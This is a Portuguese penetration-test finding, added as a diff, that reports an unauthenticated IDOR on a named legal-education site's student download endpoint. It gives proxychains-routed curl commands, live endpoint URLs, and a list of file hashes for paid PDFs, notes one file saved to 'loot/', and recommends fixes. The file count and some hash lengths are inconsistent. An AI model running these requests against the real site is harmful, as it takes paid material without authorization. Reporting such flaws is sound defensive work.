@@ -1,0 +1,61 @@
+F-002: IDOR — Download de Material Didático Restrito sem Autenticação
+================================================================
+Severidade: ALTA
+Host: https://www.g7juridico.com.br
+Endpoint: /area-do-aluno/download-arquivo/roteiros-arquivos/{hash}/pdf
+Data: 04/09/2026
+Classificação OWASP: A1 (Broken Access Control)
+
+DESCRIÇÃO
+----------
+Os PDFs de roteiros de estudo (material didático pago) podem ser baixados
+sem qualquer autenticação. O endpoint não verifica se o usuário possui 
+sessão válida ou se está matriculado no curso correspondente.
+
+REPRODUÇÃO
+----------
+Download sem cookie de autenticação:
+
+  $ proxychains4 curl -s -o /dev/null -w "%{http_code}|%{size_download}" \
+    "https://www.g7juridico.com.br/area-do-aluno/download-arquivo/roteiros-arquivos/cd46db613db263890f4165f40a1bf4030/pdf"
+  → 200|95122
+
+  $ proxychains4 curl -s -o /dev/null -w "%{http_code}|%{size_download}" \
+    "https://www.g7juridico.com.br/area-do-aluno/download-arquivo/roteiros-arquivos/f16230d351d829e9de3c7af6f1da440c0/pdf"
+  → 200|150521
+
+Todos os 11 roteiros identificados no dashboard são baixáveis:
+
+  Hash                                    Tamanho
+  cd46db613db263890f4165f40a1bf4030      95KB
+  eca963c452042fe2b64b67b27dd8d1710      98KB
+  f16230d351d829e9de3c7af6f1da440c0     150KB
+  7aebaf7f3f045339f3a701e781dec9060      99KB
+  01189d230c5a3f4c6a6e864a1777d26a0      96KB
+  898ffcfd35c8b080167201e7f98a31ca0     100KB
+  093119c4ce0576168ea821f58e74833e0      98KB
+  3183fd8ff8dec91966645d538c55b70         0KB (corrompido/vazio)
+  68cdb0b26ac7b415d36c13394e56a2a70     146KB
+  15c876a5a79eb4db28510c3ee56aa9c70      97KB
+  44828c8cb0753287595196c0b81d6a6a0      98KB
+  b8ff843eaf523842dd5ea469ecac76470     146KB
+
+Os PDFs são válidos (PDF 1.7, 1 page). Um deles foi salvo em loot/.
+
+IMPACTO
+-------
+1. Exposição de material didático pago (violação de direito autoral)
+2. Qualquer pessoa pode baixar conteúdo restrito sem pagar
+3. IDOR pode se estender a outros tipos de arquivo (vídeos, apostilas)
+
+RECOMENDAÇÃO
+------------
+1. Implementar verificação de sessão válida antes de servir arquivos
+2. Verificar se o aluno está matriculado no curso associado ao material
+3. Usar tokens temporários para acesso a arquivos
+4. Implementar rate limiting no endpoint de download
+
+EVIDÊNCIA ADICIONAL
+-------------------
+Arquivos de curso também acessíveis sem autenticação:
+  /arquivos/cursos/nome1736745381_1.png → 200 (38303 bytes)
